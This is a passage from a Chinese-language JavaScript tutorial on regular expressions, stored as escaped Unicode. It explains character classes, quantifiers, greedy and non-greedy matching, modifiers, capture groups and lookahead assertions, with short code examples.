\u5230\u5c0f\u5199\u7684 z \u4e4b\u95f452\u4e2a\u5b57\u6bcd\uff0c\u4f46\u662f\u7531\u4e8e\u5728 ASCII \u7f16\u7801\u4e4b\u4e2d\uff0c\u5927\u5199\u5b57\u6bcd\u4e0e\u5c0f\u5199\u5b57\u6bcd\u4e4b\u95f4\u8fd8\u6709\u5176\u4ed6\u5b57\u7b26\uff0c\u7ed3\u679c\u5c31\u4f1a\u51fa\u73b0\u610f\u6599\u4e4b\u5916\u7684\u7ed3\u679c\u3002 1 /[A-z]/ . test ( '\\\\' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7531\u4e8e\u53cd\u659c\u6760\uff08'\\'\uff09\u7684ASCII\u7801\u5728\u5927\u5199\u5b57\u6bcd\u4e0e\u5c0f\u5199\u5b57\u6bcd\u4e4b\u95f4\uff0c\u7ed3\u679c\u4f1a\u88ab\u9009\u4e2d\u3002 \u9884\u5b9a\u4e49\u6a21\u5f0f \u00b6 \u9884\u5b9a\u4e49\u6a21\u5f0f\u6307\u7684\u662f\u67d0\u4e9b\u5e38\u89c1\u6a21\u5f0f\u7684\u7b80\u5199\u65b9\u5f0f\u3002 \\d \u5339\u914d0-9\u4e4b\u95f4\u7684\u4efb\u4e00\u6570\u5b57\uff0c\u76f8\u5f53\u4e8e [0-9] \u3002 \\D \u5339\u914d\u6240\u67090-9\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^0-9] \u3002 \\w \u5339\u914d\u4efb\u610f\u7684\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\uff0c\u76f8\u5f53\u4e8e [A-Za-z0-9_] \u3002 \\W \u9664\u6240\u6709\u5b57\u6bcd\u3001\u6570\u5b57\u548c\u4e0b\u5212\u7ebf\u4ee5\u5916\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^A-Za-z0-9_] \u3002 \\s \u5339\u914d\u7a7a\u683c\uff08\u5305\u62ec\u6362\u884c\u7b26\u3001\u5236\u8868\u7b26\u3001\u7a7a\u683c\u7b26\u7b49\uff09\uff0c\u76f8\u7b49\u4e8e [ \\t\\r\\n\\v\\f] \u3002 \\S \u5339\u914d\u975e\u7a7a\u683c\u7684\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e [^ \\t\\r\\n\\v\\f] \u3002 \\b \u5339\u914d\u8bcd\u7684\u8fb9\u754c\u3002 \\B \u5339\u914d\u975e\u8bcd\u8fb9\u754c\uff0c\u5373\u5728\u8bcd\u7684\u5185\u90e8\u3002 \u4e0b\u9762\u662f\u4e00\u4e9b\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 // \\s \u7684\u4f8b\u5b50 /\\s\\w*/ . exec ( 'hello world' ) // [\" world\"] // \\b \u7684\u4f8b\u5b50 /\\bworld/ . test ( 'hello world' ) // true /\\bworld/ . test ( 'hello-world' ) // true /\\bworld/ . test ( 'helloworld' ) // false // \\B \u7684\u4f8b\u5b50 /\\Bworld/ . test ( 'hello-world' ) // false /\\Bworld/ . test ( 'helloworld' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\s \u8868\u793a\u7a7a\u683c\uff0c\u6240\u4ee5\u5339\u914d\u7ed3\u679c\u4f1a\u5305\u62ec\u7a7a\u683c\u3002 \\b \u8868\u793a\u8bcd\u7684\u8fb9\u754c\uff0c\u6240\u4ee5 world \u7684\u8bcd\u9996\u5fc5\u987b\u72ec\u7acb\uff08\u8bcd\u5c3e\u662f\u5426\u72ec\u7acb\u672a\u6307\u5b9a\uff09\uff0c\u624d\u4f1a\u5339\u914d\u3002\u540c\u7406\uff0c \\B \u8868\u793a\u975e\u8bcd\u7684\u8fb9\u754c\uff0c\u53ea\u6709 world \u7684\u8bcd\u9996\u4e0d\u72ec\u7acb\uff0c\u624d\u4f1a\u5339\u914d\u3002 \u901a\u5e38\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u9047\u5230\u6362\u884c\u7b26\uff08 \\n \uff09\u5c31\u4f1a\u505c\u6b62\u5339\u914d\u3002 1 2 3 4 var html = \"<b>Hello</b>\\n<i>world!</i>\" ; /.*/ . exec ( html )[ 0 ] // \"<b>Hello</b>\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32 html \u5305\u542b\u4e00\u4e2a\u6362\u884c\u7b26\uff0c\u7ed3\u679c\u70b9\u5b57\u7b26\uff08 . \uff09\u4e0d\u5339\u914d\u6362\u884c\u7b26\uff0c\u5bfc\u81f4\u5339\u914d\u7ed3\u679c\u53ef\u80fd\u4e0d\u7b26\u5408\u539f\u610f\u3002\u8fd9\u65f6\u4f7f\u7528 \\s \u5b57\u7b26\u7c7b\uff0c\u5c31\u80fd\u5305\u62ec\u6362\u884c\u7b26\u3002 1 2 3 4 var html = \"<b>Hello</b>\\n<i>world!</i>\" ; /[\\S\\s]*/ . exec ( html )[ 0 ] // \"<b>Hello</b>\\n<i>world!</i>\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c [\\S\\s] \u6307\u4ee3\u4e00\u5207\u5b57\u7b26\u3002 \u91cd\u590d\u7c7b \u00b6 \u6a21\u5f0f\u7684\u7cbe\u786e\u5339\u914d\u6b21\u6570\uff0c\u4f7f\u7528\u5927\u62ec\u53f7\uff08 {} \uff09\u8868\u793a\u3002 {n} \u8868\u793a\u6070\u597d\u91cd\u590d n \u6b21\uff0c {n,} \u8868\u793a\u81f3\u5c11\u91cd\u590d n \u6b21\uff0c {n,m} \u8868\u793a\u91cd\u590d\u4e0d\u5c11\u4e8e n \u6b21\uff0c\u4e0d\u591a\u4e8e m \u6b21\u3002 1 2 /lo{2}k/ . test ( 'look' ) // true /lo{2,5}k/ . test ( 'looook' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6a21\u5f0f\u6307\u5b9a o \u8fde\u7eed\u51fa\u73b02\u6b21\uff0c\u7b2c\u4e8c\u4e2a\u6a21\u5f0f\u6307\u5b9a o \u8fde\u7eed\u51fa\u73b02\u6b21\u52305\u6b21\u4e4b\u95f4\u3002 \u91cf\u8bcd\u7b26 \u00b6 \u91cf\u8bcd\u7b26\u7528\u6765\u8bbe\u5b9a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b0\u7684\u6b21\u6570\u3002 ? \u95ee\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u62161\u6b21\uff0c\u7b49\u540c\u4e8e {0, 1} \u3002 * \u661f\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u6216\u591a\u6b21\uff0c\u7b49\u540c\u4e8e {0,} \u3002 + \u52a0\u53f7\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b01\u6b21\u6216\u591a\u6b21\uff0c\u7b49\u540c\u4e8e {1,} \u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 // t \u51fa\u73b00\u6b21\u62161\u6b21 /t?est/ . test ( 'test' ) // true /t?est/ . test ( 'est' ) // true // t \u51fa\u73b01\u6b21\u6216\u591a\u6b21 /t+est/ . test ( 'test' ) // true /t+est/ . test ( 'ttest' ) // true /t+est/ . test ( 'est' ) // false // t \u51fa\u73b00\u6b21\u6216\u591a\u6b21 /t*est/ . test ( 'test' ) // true /t*est/ . test ( 'ttest' ) // true /t*est/ . test ( 'tttest' ) // true /t*est/ . test ( 'est' ) // true \u8d2a\u5a6a\u6a21\u5f0f \u00b6 \u4e0a\u4e00\u5c0f\u8282\u7684\u4e09\u4e2a\u91cf\u8bcd\u7b26\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u90fd\u662f\u6700\u5927\u53ef\u80fd\u5339\u914d\uff0c\u5373\u5339\u914d\u5230\u4e0b\u4e00\u4e2a\u5b57\u7b26\u4e0d\u6ee1\u8db3\u5339\u914d\u89c4\u5219\u4e3a\u6b62\u3002\u8fd9\u88ab\u79f0\u4e3a\u8d2a\u5a6a\u6a21\u5f0f\u3002 1 2 var s = 'aaa' ; s . match ( /a+/ ) // [\"aaa\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6a21\u5f0f\u662f /a+/ \uff0c\u8868\u793a\u5339\u914d1\u4e2a a \u6216\u591a\u4e2a a \uff0c\u90a3\u4e48\u5230\u5e95\u4f1a\u5339\u914d\u51e0\u4e2a a \u5462\uff1f\u56e0\u4e3a\u9ed8\u8ba4\u662f\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u4f1a\u4e00\u76f4\u5339\u914d\u5230\u5b57\u7b26 a \u4e0d\u51fa\u73b0\u4e3a\u6b62\uff0c\u6240\u4ee5\u5339\u914d\u7ed3\u679c\u662f3\u4e2a a \u3002 \u9664\u4e86\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u8fd8\u6709\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u5373\u6700\u5c0f\u53ef\u80fd\u5339\u914d\u3002\u53ea\u8981\u4e00\u53d1\u73b0\u5339\u914d\uff0c\u5c31\u8fd4\u56de\u7ed3\u679c\uff0c\u4e0d\u8981\u5f80\u4e0b\u68c0\u67e5\u3002\u5982\u679c\u60f3\u5c06\u8d2a\u5a6a\u6a21\u5f0f\u6539\u4e3a\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u53ef\u4ee5\u5728\u91cf\u8bcd\u7b26\u540e\u9762\u52a0\u4e00\u4e2a\u95ee\u53f7\u3002 1 2 var s = 'aaa' ; s . match ( /a+?/ ) // [\"a\"] \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c\u6a21\u5f0f\u7ed3\u5c3e\u6dfb\u52a0\u4e86\u4e00\u4e2a\u95ee\u53f7 /a+?/ \uff0c\u8fd9\u65f6\u5c31\u6539\u4e3a\u975e\u8d2a\u5a6a\u6a21\u5f0f\uff0c\u4e00\u65e6\u6761\u4ef6\u6ee1\u8db3\uff0c\u5c31\u4e0d\u518d\u5f80\u4e0b\u5339\u914d\uff0c +? \u8868\u793a\u53ea\u8981\u53d1\u73b0\u4e00\u4e2a a \uff0c\u5c31\u4e0d\u518d\u5f80\u4e0b\u5339\u914d\u4e86\u3002 \u9664\u4e86\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u52a0\u53f7\uff08 +? \uff09\uff0c\u8fd8\u6709\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u661f\u53f7\uff08 *? \uff09\u548c\u975e\u8d2a\u5a6a\u6a21\u5f0f\u7684\u95ee\u53f7\uff08 ?? \uff09\u3002 +? \uff1a\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b01\u6b21\u6216\u591a\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 *? \uff1a\u8868\u793a\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u6216\u591a\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 ?? \uff1a\u8868\u683c\u67d0\u4e2a\u6a21\u5f0f\u51fa\u73b00\u6b21\u62161\u6b21\uff0c\u5339\u914d\u65f6\u91c7\u7528\u975e\u8d2a\u5a6a\u6a21\u5f0f\u3002 1 2 3 4 5 'abb' . match ( /ab*/ ) // [\"abb\"] 'abb' . match ( /ab*?/ ) // [\"a\"] 'abb' . match ( /ab?/ ) // [\"ab\"] 'abb' . match ( /ab??/ ) // [\"a\"] \u4e0a\u9762\u4f8b\u5b50\u4e2d\uff0c /ab*/ \u8868\u793a\u5982\u679c a \u540e\u9762\u6709\u591a\u4e2a b \uff0c\u90a3\u4e48\u5339\u914d\u5c3d\u53ef\u80fd\u591a\u7684 b \uff1b /ab*?/ \u8868\u793a\u5339\u914d\u5c3d\u53ef\u80fd\u5c11\u7684 b \uff0c\u4e5f\u5c31\u662f0\u4e2a b \u3002 \u4fee\u9970\u7b26 \u00b6 \u4fee\u9970\u7b26\uff08modifier\uff09\u8868\u793a\u6a21\u5f0f\u7684\u9644\u52a0\u89c4\u5219\uff0c\u653e\u5728\u6b63\u5219\u6a21\u5f0f\u7684\u6700\u5c3e\u90e8\u3002 \u4fee\u9970\u7b26\u53ef\u4ee5\u5355\u4e2a\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u591a\u4e2a\u4e00\u8d77\u4f7f\u7528\u3002 1 2 3 4 5 // \u5355\u4e2a\u4fee\u9970\u7b26 var regex = /test/i ; // \u591a\u4e2a\u4fee\u9970\u7b26 var regex = /test/ig ; \uff081\uff09g \u4fee\u9970\u7b26 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u7b2c\u4e00\u6b21\u5339\u914d\u6210\u529f\u540e\uff0c\u6b63\u5219\u5bf9\u8c61\u5c31\u505c\u6b62\u5411\u4e0b\u5339\u914d\u4e86\u3002 g \u4fee\u9970\u7b26\u8868\u793a\u5168\u5c40\u5339\u914d\uff08global\uff09\uff0c\u52a0\u4e0a\u5b83\u4ee5\u540e\uff0c\u6b63\u5219\u5bf9\u8c61\u5c06\u5339\u914d\u5168\u90e8\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c\uff0c\u4e3b\u8981\u7528\u4e8e\u641c\u7d22\u548c\u66ff\u6362\u3002 1 2 3 4 5 6 var regex = /b/ ; var str = 'abba' ; regex . test ( str ); // true regex . test ( str ); // true regex . test ( str ); // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u6a21\u5f0f\u4e0d\u542b g \u4fee\u9970\u7b26\uff0c\u6bcf\u6b21\u90fd\u662f\u4ece\u5b57\u7b26\u4e32\u5934\u90e8\u5f00\u59cb\u5339\u914d\u3002\u6240\u4ee5\uff0c\u8fde\u7eed\u505a\u4e86\u4e09\u6b21\u5339\u914d\uff0c\u90fd\u8fd4\u56de true \u3002 1 2 3 4 5 6 var regex = /b/g ; var str = 'abba' ; regex . test ( str ); // true regex . test ( str ); // true regex . test ( str ); // false \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u6a21\u5f0f\u542b\u6709 g \u4fee\u9970\u7b26\uff0c\u6bcf\u6b21\u90fd\u662f\u4ece\u4e0a\u4e00\u6b21\u5339\u914d\u6210\u529f\u5904\uff0c\u5f00\u59cb\u5411\u540e\u5339\u914d\u3002\u56e0\u4e3a\u5b57\u7b26\u4e32 abba \u53ea\u6709\u4e24\u4e2a b \uff0c\u6240\u4ee5\u524d\u4e24\u6b21\u5339\u914d\u7ed3\u679c\u4e3a true \uff0c\u7b2c\u4e09\u6b21\u5339\u914d\u7ed3\u679c\u4e3a false \u3002 \uff082\uff09i \u4fee\u9970\u7b26 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u6b63\u5219\u5bf9\u8c61\u533a\u5206\u5b57\u6bcd\u7684\u5927\u5c0f\u5199\uff0c\u52a0\u4e0a i \u4fee\u9970\u7b26\u4ee5\u540e\u8868\u793a\u5ffd\u7565\u5927\u5c0f\u5199\uff08ignoreCase\uff09\u3002 1 2 /abc/ . test ( 'ABC' ) // false /abc/i . test ( 'ABC' ) // true \u4e0a\u9762\u4ee3\u7801\u8868\u793a\uff0c\u52a0\u4e86 i \u4fee\u9970\u7b26\u4ee5\u540e\uff0c\u4e0d\u8003\u8651\u5927\u5c0f\u5199\uff0c\u6240\u4ee5\u6a21\u5f0f abc \u5339\u914d\u5b57\u7b26\u4e32 ABC \u3002 \uff083\uff09m \u4fee\u9970\u7b26 m \u4fee\u9970\u7b26\u8868\u793a\u591a\u884c\u6a21\u5f0f\uff08multiline\uff09\uff0c\u4f1a\u4fee\u6539 ^ \u548c $ \u7684\u884c\u4e3a\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff08\u5373\u4e0d\u52a0 m \u4fee\u9970\u7b26\u65f6\uff09\uff0c ^ \u548c $ \u5339\u914d\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\u548c\u7ed3\u5c3e\u5904\uff0c\u52a0\u4e0a m \u4fee\u9970\u7b26\u4ee5\u540e\uff0c ^ \u548c $ \u8fd8\u4f1a\u5339\u914d\u884c\u9996\u548c\u884c\u5c3e\uff0c\u5373 ^ \u548c $ \u4f1a\u8bc6\u522b\u6362\u884c\u7b26\uff08 \\n \uff09\u3002 1 2 /world$/ . test ( 'hello world\\n' ) // false /world$/m . test ( 'hello world\\n' ) // true \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u5b57\u7b26\u4e32\u7ed3\u5c3e\u5904\u6709\u4e00\u4e2a\u6362\u884c\u7b26\u3002\u5982\u679c\u4e0d\u52a0 m \u4fee\u9970\u7b26\uff0c\u5339\u914d\u4e0d\u6210\u529f\uff0c\u56e0\u4e3a\u5b57\u7b26\u4e32\u7684\u7ed3\u5c3e\u4e0d\u662f world \uff1b\u52a0\u4e0a\u4ee5\u540e\uff0c $ \u53ef\u4ee5\u5339\u914d\u884c\u5c3e\u3002 1 /^b/m . test ( 'a\\nb' ) // true \u4e0a\u9762\u4ee3\u7801\u8981\u6c42\u5339\u914d\u884c\u9996\u7684 b \uff0c\u5982\u679c\u4e0d\u52a0 m \u4fee\u9970\u7b26\uff0c\u5c31\u76f8\u5f53\u4e8e b \u53ea\u80fd\u5904\u5728\u5b57\u7b26\u4e32\u7684\u5f00\u59cb\u5904\u3002\u52a0\u4e0a m \u4fee\u9970\u7b26\u4ee5\u540e\uff0c\u6362\u884c\u7b26 \\n \u4e5f\u4f1a\u88ab\u8ba4\u4e3a\u662f\u4e00\u884c\u7684\u5f00\u59cb\u3002 \u7ec4\u5339\u914d \u00b6 \uff081\uff09\u6982\u8ff0 \u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u62ec\u53f7\u8868\u793a\u5206\u7ec4\u5339\u914d\uff0c\u62ec\u53f7\u4e2d\u7684\u6a21\u5f0f\u53ef\u4ee5\u7528\u6765\u5339\u914d\u5206\u7ec4\u7684\u5185\u5bb9\u3002 1 2 /fred+/ . test ( 'fredd' ) // true /(fred)+/ . test ( 'fredfred' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u6a21\u5f0f\u6ca1\u6709\u62ec\u53f7\uff0c\u7ed3\u679c + \u53ea\u8868\u793a\u91cd\u590d\u5b57\u6bcd d \uff0c\u7b2c\u4e8c\u4e2a\u6a21\u5f0f\u6709\u62ec\u53f7\uff0c\u7ed3\u679c + \u5c31\u8868\u793a\u5339\u914d fred \u8fd9\u4e2a\u8bcd\u3002 \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u5206\u7ec4\u6355\u83b7\u7684\u4f8b\u5b50\u3002 1 2 3 var m = 'abcabc' . match ( /(.)b(.)/ ); m // ['abc', 'a', 'c'] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f /(.)b(.)/ \u4e00\u5171\u4f7f\u7528\u4e24\u4e2a\u62ec\u53f7\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u6355\u83b7 a \uff0c\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u6355\u83b7 c \u3002 \u6ce8\u610f\uff0c\u4f7f\u7528\u7ec4\u5339\u914d\u65f6\uff0c\u4e0d\u5b9c\u540c\u65f6\u4f7f\u7528 g \u4fee\u9970\u7b26\uff0c\u5426\u5219 match \u65b9\u6cd5\u4e0d\u4f1a\u6355\u83b7\u5206\u7ec4\u7684\u5185\u5bb9\u3002 1 2 var m = 'abcabc' . match ( /(.)b(.)/g ); m // ['abc', 'abc'] \u4e0a\u9762\u4ee3\u7801\u4f7f\u7528\u5e26 g \u4fee\u9970\u7b26\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u7ed3\u679c match \u65b9\u6cd5\u53ea\u6355\u83b7\u4e86\u5339\u914d\u6574\u4e2a\u8868\u8fbe\u5f0f\u7684\u90e8\u5206\u3002\u8fd9\u65f6\u5fc5\u987b\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684 exec \u65b9\u6cd5\uff0c\u914d\u5408\u5faa\u73af\uff0c\u624d\u80fd\u8bfb\u5230\u6bcf\u4e00\u8f6e\u5339\u914d\u7684\u7ec4\u6355\u83b7\u3002 1 2 3 4 5 6 7 8 9 var str = 'abcabc' ; var reg = /(.)b(.)/g ; while ( true ) { var result = reg . exec ( str ); if ( ! result ) break ; console . log ( result ); } // [\"abc\", \"a\", \"c\"] // [\"abc\", \"a\", \"c\"] \u6b63\u5219\u8868\u8fbe\u5f0f\u5185\u90e8\uff0c\u8fd8\u53ef\u4ee5\u7528 \\n \u5f15\u7528\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff0c n \u662f\u4ece1\u5f00\u59cb\u7684\u81ea\u7136\u6570\uff0c\u8868\u793a\u5bf9\u5e94\u987a\u5e8f\u7684\u62ec\u53f7\u3002 1 2 /(.)b(.)\\1b\\2/ . test ( \"abcabc\" ) // true \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c \\1 \u8868\u793a\u7b2c\u4e00\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff08\u5373 a \uff09\uff0c \\2 \u8868\u793a\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\uff08\u5373 c \uff09\u3002 \u4e0b\u9762\u662f\u53e6\u5916\u4e00\u4e2a\u4f8b\u5b50\u3002 1 /y(..)(.)\\2\\1/ . test ( 'yabccab' ) // true \u62ec\u53f7\u8fd8\u53ef\u4ee5\u5d4c\u5957\u3002 1 /y((..)\\2)\\1/ . test ( 'yabababab' ) // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c \\1 \u6307\u5411\u5916\u5c42\u62ec\u53f7\uff0c \\2 \u6307\u5411\u5185\u5c42\u62ec\u53f7\u3002 \u7ec4\u5339\u914d\u975e\u5e38\u6709\u7528\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u5339\u914d\u7f51\u9875\u6807\u7b7e\u7684\u4f8b\u5b50\u3002 1 2 3 4 var tagName = /<([^>]+)>[^<]*<\\/\\1>/ ; tagName . exec ( \"<b>bold</b>\" )[ 1 ] // 'b' \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5706\u62ec\u53f7\u5339\u914d\u5c16\u62ec\u53f7\u4e4b\u4e2d\u7684\u6807\u7b7e\uff0c\u800c \\1 \u5c31\u8868\u793a\u5bf9\u5e94\u7684\u95ed\u5408\u6807\u7b7e\u3002 \u4e0a\u9762\u4ee3\u7801\u7565\u52a0\u4fee\u6539\uff0c\u5c31\u80fd\u6355\u83b7\u5e26\u6709\u5c5e\u6027\u7684\u6807\u7b7e\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 var html = '<b class=\"hello\">Hello</b><i>world</i>' ; var tag = /<(\\w+)([^>]*)>(.*?)<\\/\\1>/g ; var match = tag . exec ( html ); match [ 1 ] // \"b\" match [ 2 ] // \" class=\"hello\"\" match [ 3 ] // \"Hello\" match = tag . exec ( html ); match [ 1 ] // \"i\" match [ 2 ] // \"\" match [ 3 ] // \"world\" \uff082\uff09\u975e\u6355\u83b7\u7ec4 (?:x) \u79f0\u4e3a\u975e\u6355\u83b7\u7ec4\uff08Non-capturing group\uff09\uff0c\u8868\u793a\u4e0d\u8fd4\u56de\u8be5\u7ec4\u5339\u914d\u7684\u5185\u5bb9\uff0c\u5373\u5339\u914d\u7684\u7ed3\u679c\u4e2d\u4e0d\u8ba1\u5165\u8fd9\u4e2a\u62ec\u53f7\u3002 \u975e\u6355\u83b7\u7ec4\u7684\u4f5c\u7528\u8bf7\u8003\u8651\u8fd9\u6837\u4e00\u4e2a\u573a\u666f\uff0c\u5047\u5b9a\u9700\u8981\u5339\u914d foo \u6216\u8005 foofoo \uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u5c31\u5e94\u8be5\u5199\u6210 /(foo){1, 2}/ \uff0c\u4f46\u662f\u8fd9\u6837\u4f1a\u5360\u7528\u4e00\u4e2a\u7ec4\u5339\u914d\u3002\u8fd9\u65f6\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u975e\u6355\u83b7\u7ec4\uff0c\u5c06\u6b63\u5219\u8868\u8fbe\u5f0f\u6539\u4e3a /(?:foo){1, 2}/ \uff0c\u5b83\u7684\u4f5c\u7528\u4e0e\u524d\u4e00\u4e2a\u6b63\u5219\u662f\u4e00\u6837\u7684\uff0c\u4f46\u662f\u4e0d\u4f1a\u5355\u72ec\u8f93\u51fa\u62ec\u53f7\u5185\u90e8\u7684\u5185\u5bb9\u3002 \u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\u3002 1 2 var m = 'abc' . match ( /(?:.)b(.)/ ); m // [\"abc\", \"c\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\u7684\u6a21\u5f0f\uff0c\u4e00\u5171\u4f7f\u7528\u4e86\u4e24\u4e2a\u62ec\u53f7\u3002\u5176\u4e2d\u7b2c\u4e00\u4e2a\u62ec\u53f7\u662f\u975e\u6355\u83b7\u7ec4\uff0c\u6240\u4ee5\u6700\u540e\u8fd4\u56de\u7684\u7ed3\u679c\u4e2d\u6ca1\u6709\u7b2c\u4e00\u4e2a\u62ec\u53f7\uff0c\u53ea\u6709\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u5339\u914d\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u7528\u6765\u5206\u89e3\u7f51\u5740\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 1 2 3 4 5 6 7 8 9 10 11 // \u6b63\u5e38\u5339\u914d var url = /(http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/ ; url . exec ( 'http://google.com/' ); // [\"http://google.com/\", \"http\", \"google.com\", \"/\"] // \u975e\u6355\u83b7\u7ec4\u5339\u914d var url = /(?:http|ftp):\\/\\/([^/\\r\\n]+)(\\/[^\\r\\n]*)?/ ; url . exec ( 'http://google.com/' ); // [\"http://google.com/\", \"google.com\", \"/\"] \u4e0a\u9762\u7684\u4ee3\u7801\u4e2d\uff0c\u524d\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u6b63\u5e38\u5339\u914d\uff0c\u7b2c\u4e00\u4e2a\u62ec\u53f7\u8fd4\u56de\u7f51\u7edc\u534f\u8bae\uff1b\u540e\u4e00\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f\u662f\u975e\u6355\u83b7\u5339\u914d\uff0c\u8fd4\u56de\u7ed3\u679c\u4e2d\u4e0d\u5305\u62ec\u7f51\u7edc\u534f\u8bae\u3002 \uff083\uff09\u5148\u884c\u65ad\u8a00 x(?=y) \u79f0\u4e3a\u5148\u884c\u65ad\u8a00\uff08Positive look-ahead\uff09\uff0c x \u53ea\u6709\u5728 y \u524d\u9762\u624d\u5339\u914d\uff0c y \u4e0d\u4f1a\u88ab\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u8981\u5339\u914d\u540e\u9762\u8ddf\u7740\u767e\u5206\u53f7\u7684\u6570\u5b57\uff0c\u53ef\u4ee5\u5199\u6210 /\\d+(?=%)/ \u3002 \u201c\u5148\u884c\u65ad\u8a00\u201d\u4e2d\uff0c\u62ec\u53f7\u91cc\u7684\u90e8\u5206\u662f\u4e0d\u4f1a\u8fd4\u56de\u7684\u3002 1 2 var m = 'abc' . match ( /b(?=c)/ ); m // [\"b\"] \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u4e86\u5148\u884c\u65ad\u8a00\uff0c b \u5728 c \u524d\u9762\u6240\u4ee5\u88ab\u5339\u914d\uff0c\u4f46\u662f\u62ec\u53f7\u5bf9\u5e94\u7684 c \u4e0d\u4f1a\u88ab\u8fd4\u56de\u3002 \uff084\uff09\u5148\u884c\u5426\u5b9a\u65ad\u8a00 x(?!y) \u79f0\u4e3a\u5148\u884c\u5426\u5b9a\u65ad\u8a00\uff08Negative look-ahead\uff09\uff0c x \u53ea\u6709\u4e0d\u5728 y \u524d\u9762\u624d\u5339\u914d\uff0c y \u4e0d\u4f1a\u88ab\u8ba1\u5165\u8fd4\u56de\u7ed3\u679c\u3002\u6bd4\u5982\uff0c\u8981\u5339\u914d\u540e\u9762\u8ddf\u7684\u4e0d\u662f\u767e\u5206\u53f7\u7684\u6570\u5b57\uff0c\u5c31\u8981\u5199\u6210 /\\d+(?!%)/ \u3002 1 2 /\\d+(?!\\.)/ . exec ( '3.14' ) // [\"14\"] \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u6b63\u5219\u8868\u8fbe\u5f0f\u6307\u5b9a\uff0c\u53ea\u6709\u4e0d\u5728\u5c0f\u6570\u70b9\u524d\u9762\u7684\u6570\u5b57\u624d\u4f1a\u88ab\u5339\u914d\uff0c\u56e0\u6b64\u8fd4\u56de\u7684\u7ed3\u679c\u5c31\u662f 14 \u3002 \u201c\u5148\u884c\u5426\u5b9a\u65ad\u8a00\u201d\u4e2d\uff0c\u62ec\u53f7\u91cc\u7684\u90e8\u5206\u662f\u4e0d\u4f1a\u8fd4\u56de\u7684\u3002 1 2 var m = 'abd' . match ( /b(?!c)/ ); m // ['b'] \u4e0a\u9762\u7684\u4ee3\u7801\u4f7f\u7528\u4e86\u5148\u884c\u5426\u5b9a\u65ad\u8a00\uff0c b \u4e0d\u5728 c 